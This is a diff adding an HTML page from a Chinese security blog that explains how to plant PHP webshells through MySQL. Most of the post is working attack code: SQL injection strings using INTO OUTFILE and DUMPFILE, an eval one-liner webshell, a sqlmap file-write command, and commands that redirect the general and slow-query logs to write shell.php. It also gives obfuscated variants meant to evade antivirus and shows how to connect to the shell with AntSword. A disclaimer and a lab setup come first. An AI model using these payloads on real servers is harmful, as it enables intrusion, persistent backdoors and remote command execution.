@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="漏洞描述 声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ 关于MySQL写shell的方法网上基本很多了，我也在此总结下。众所周知，web渗透的成功很多是需要前置条件的，比如中间件的配置不当、账户权限的混淆等等，这些看起来或许只是为增强用户体验感而设计的功能，在安全研究人员的面前就变味了……">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL写shell的利用">
+<meta property="og:url" content="http://example.com/2021/11/01/MySQL%E5%86%99shell%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="cat-nineteen">
+<meta property="og:description" content="漏洞描述 声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！ 关于MySQL写shell的方法网上基本很多了，我也在此总结下。众所周知，web渗透的成功很多是需要前置条件的，比如中间件的配置不当、账户权限的混淆等等，这些看起来或许只是为增强用户体验感而设计的功能，在安全研究人员的面前就变味了……">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101110402178.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191655678.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191826638.png">
+<meta property="og:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191936639.png">
+<meta property="article:published_time" content="2021-11-01T02:59:00.713Z">
+<meta property="article:modified_time" content="2021-11-01T12:47:32.779Z">
+<meta property="article:author" content="longer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101110402178.png">
+
+<link rel="canonical" href="http://example.com/2021/11/01/MySQL%E5%86%99shell%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MySQL写shell的利用 | cat-nineteen</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">cat-nineteen</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/MySQL%E5%86%99shell%E7%9A%84%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="longer">
+      <meta itemprop="description" content="不愿分享小故事的脚本小子成不了心灵骇客！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cat-nineteen">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MySQL写shell的利用
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-01 10:59:00 / 修改时间：20:47:32" itemprop="dateCreated datePublished" datetime="2021-11-01T10:59:00+08:00">2021-11-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>关于MySQL写shell的方法网上基本很多了，我也在此总结下。众所周知，web渗透的成功很多是需要前置条件的，比如中间件的配置不当、账户权限的混淆等等，这些看起来或许只是为增强用户体验感而设计的功能，在安全研究人员的面前就变味了……</p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
+<p>全版本？</p>
+<hr>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
+<li>Windows 7</li>
+<li>点击下载<a target="_blank" rel="noopener" href="https://www.xp.cn/download.html">phpStudy</a>，安装并启动；</li>
+</ol>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101110402178.png" alt="image-20211101110402178"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="MySQL权限的获取"><a href="#MySQL权限的获取" class="headerlink" title="MySQL权限的获取"></a>MySQL权限的获取</h3><p>拿到 MySQL 的用户名和密码的方式多种多样：</p>
+<ol>
+<li>MySQL 3306 端口弱口令爆破</li>
+<li>sqlmap 注入的 <code>--sql-shell</code> 模式</li>
+<li>网站的数据库配置文件中拿到明文密码信息</li>
+<li>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</li>
+</ol>
+<h3 id="MySQL-shell的写入条件"><a href="#MySQL-shell的写入条件" class="headerlink" title="MySQL shell的写入条件"></a>MySQL shell的写入条件</h3><ol>
+<li>数据库当前用户为root权限；</li>
+<li>知道当前网站的绝对路径；</li>
+<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
+<li>写入shell的路径存在写入权限；</li>
+<li><code>secure_file_priv</code> 无限制。</li>
+</ol>
+<h3 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong><code>outfile</code>和<code>dumpfile</code>的区别：</strong></p>
+<p><code>outfile</code>:</p>
+<ol>
+<li>支持多行数据同时导出；</li>
+<li>使用union联合查询时，要保证两侧查询的列数相同；</li>
+<li>会在换行符制表符后面追加反斜杠；</li>
+<li>会在末尾追加换行。</li>
+</ol>
+<p><code>dumpfile</code>:</p>
+<ol>
+<li>每次只能导出一行数据；</li>
+<li>不会在换行符制表符后面追加反斜杠；</li>
+<li>不会在末尾追加换行。</li>
+</ol>
+<p><strong>基于UNION联合查询</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 UNION ALL SELECT 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;C:\info.php&#x27;%23</span><br><span class="line">?id=1 UNION ALL SELECT 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into dumpfile &#x27;C:\info.php&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>非联合查询</strong></p>
+<p>当无法使用<code>UNION联合查询</code>时，可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 into outfile &#x27;C:\info.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>代替空格的方法</strong></p>
+<p><code>+</code>号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、<code>/**/</code>注释符等</p>
+<h4 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a><code>into oufile</code> 写 shell</h4><p>查询MySQL是否没有 secure_file_priv 限制；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Value</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">NULL</td>
+<td align="left">不允许导入或导出</td>
+</tr>
+<tr>
+<td align="left">/tmp</td>
+<td align="left">只允许在 /tmp 目录导入导出</td>
+</tr>
+<tr>
+<td align="left">空</td>
+<td align="left">不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>说明：</p>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件。</p>
+<p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件。</p>
+</blockquote>
+<h5 id="原生一句话shell"><a href="#原生一句话shell" class="headerlink" title="原生一句话shell"></a>原生一句话shell</h5><p>满足上<code>secure_file_priv</code>为空的条件，那么可以尝试使用下面原生的 SQL 语句来直接写 一句话木马（直接在MySQL中执行）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[pass]); ?&gt;&#x27; into outfile &#x27;/var/www/html/info.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="sqlmap写入shell"><a href="#sqlmap写入shell" class="headerlink" title="sqlmap写入shell"></a>sqlmap写入shell</h5><p>sqlmap 中可以如下操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-1/?id=1&quot; --file-write=&#x27;shellpass.php&#x27; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="into-dumpfile写shell"><a href="#into-dumpfile写shell" class="headerlink" title="into dumpfile写shell"></a><code>into dumpfile</code>写shell</h4><p>突破<code>secure-file-priv</code>写shell;</p>
+<blockquote>
+<p>日志文件写shell，前提：</p>
+<ul>
+<li>Web 文件夹宽松权限可以写入</li>
+<li>Windows 系统下</li>
+<li>高权限运行 MySQL 或者 Apache</li>
+</ul>
+</blockquote>
+<p>说到底，就是修改MySQL的日志变量路径为shell.php。一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。</p>
+<h5 id="普通型shell"><a href="#普通型shell" class="headerlink" title="普通型shell"></a>普通型shell</h5><p>在MySQL命令行中依次执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="line">set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="line">set global general_log_file = &#x27;C:\\phpStudy\\WWW\\shell\\shell.php&#x27;;		--设置日志路径</span><br><span class="line"># 若出现以下报错信息说明此MySQL用户没用写入目录文件的权限：</span><br><span class="line">ERROR 1231 (42000): Variable &#x27;general_log_file&#x27; can&#x27;t be set to the value of &#x27;C:</span><br><span class="line">\phpStudy\WWW\shell\shell.php&#x27;</span><br><span class="line">* 解决：手工在C:\phpStudy\WWW\shell\目录下新建shell.php文件</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;		--执行查询，写入shell</span><br></pre></td></tr></table></figure>
+
+<p>具体操作如下演示；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%general%&#x27;;</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">| Variable_name    | Value                              |</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">| general_log      | ON                                 |</span><br><span class="line">| general_log_file | C:\phpStudy\MySQL\data\long-PC.log |</span><br><span class="line">+------------------+------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log = on;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set global general_log_file = &#x27;C:\\phpStudy\\WWW\\shell\\shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| Variable_name    | Value                           |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">| general_log      | ON                              |</span><br><span class="line">| general_log_file | C:\phpStudy\WWW\shell\shell.php |</span><br><span class="line">+------------------+---------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;&lt;?php @eval($_POST[pass])?&gt;&#x27;;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[pass])?&gt; |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| &lt;?php @eval($_POST[pass])?&gt; |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="免杀型shell"><a href="#免杀型shell" class="headerlink" title="免杀型shell"></a>免杀型shell</h5><p>利用改变MySQL日志变量环境写shell，还可以写入具有一定免杀性的shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php $sl = create_function(&#x27;&#x27;, @$_REQUEST[&#x27;klion&#x27;]);$sl();?&gt;&quot;;</span><br><span class="line"></span><br><span class="line">SELECT &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;username&#x27;]));?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="隐蔽型shell"><a href="#隐蔽型shell" class="headerlink" title="隐蔽型shell"></a>隐蔽型shell</h5><p>利用改变MySQL日志变量环境写shell，还可以利用MySQL的特性<code>慢查询</code>来写shell；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</span><br><span class="line">show variables like &#x27;%slow_query_log%&#x27;;		--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;				--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;	--修改日志文件路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(11);				--写shell</span><br></pre></td></tr></table></figure>
+
+<h4 id="连接shell"><a href="#连接shell" class="headerlink" title="连接shell"></a>连接shell</h4><p>使用<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">中国蚁剑</a>连接shell；</p>
+<p>浏览器访问shell：<a target="_blank" rel="noopener" href="http://192.168.220.130/shell/shell.php">http://192.168.220.130/shell/shell.php</a></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191655678.png" alt="image-20211101191655678"></p>
+<p>添加一条shell数据；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191826638.png" alt="image-20211101191826638"></p>
+<p>启用虚拟终端执行命令；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211101191936639.png" alt="image-20211101191936639"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://dropann.github.io/p/9409b6b3.html">https://dropann.github.io/p/9409b6b3.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://gitee.com/cat-nineteen/blog/raw/master/imgs/guanzhu.png">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/10/30/SQL%E6%B3%A8%E5%85%A5-%E6%99%BA%E8%83%BD%E5%9E%83%E5%9C%BE%E5%88%86%E7%B1%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" rel="prev" title="SQL注入-智能垃圾分类管理系统">
+      <i class="fa fa-chevron-left"></i> SQL注入-智能垃圾分类管理系统
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/11/01/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" rel="next" title="锐捷NBR路由器存在弱口令漏洞">
+      锐捷NBR路由器存在弱口令漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL%E6%9D%83%E9%99%90%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="nav-number">4.1.</span> <span class="nav-text">MySQL权限的获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MySQL-shell%E7%9A%84%E5%86%99%E5%85%A5%E6%9D%A1%E4%BB%B6"><span class="nav-number">4.2.</span> <span class="nav-text">MySQL shell的写入条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#outfile%E5%92%8Cdumpfile%E5%86%99shell"><span class="nav-number">4.3.</span> <span class="nav-text">outfile和dumpfile写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">4.3.1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#into-oufile-%E5%86%99-shell"><span class="nav-number">4.3.2.</span> <span class="nav-text">into oufile 写 shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%94%9F%E4%B8%80%E5%8F%A5%E8%AF%9Dshell"><span class="nav-number">4.3.2.1.</span> <span class="nav-text">原生一句话shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlmap%E5%86%99%E5%85%A5shell"><span class="nav-number">4.3.2.2.</span> <span class="nav-text">sqlmap写入shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#into-dumpfile%E5%86%99shell"><span class="nav-number">4.3.3.</span> <span class="nav-text">into dumpfile写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E5%9E%8Bshell"><span class="nav-number">4.3.3.1.</span> <span class="nav-text">普通型shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E5%9E%8Bshell"><span class="nav-number">4.3.3.2.</span> <span class="nav-text">免杀型shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9A%90%E8%94%BD%E5%9E%8Bshell"><span class="nav-number">4.3.3.3.</span> <span class="nav-text">隐蔽型shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5shell"><span class="nav-number">4.3.4.</span> <span class="nav-text">连接shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">longer</p>
+  <div class="site-description" itemprop="description">不愿分享小故事的脚本小子成不了心灵骇客！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://dropann.github.io/" title="https:&#x2F;&#x2F;dropann.github.io&#x2F;" rel="noopener" target="_blank">DropAnn</a>
+        </li>
+        <li class="links-of-blogroll-item">
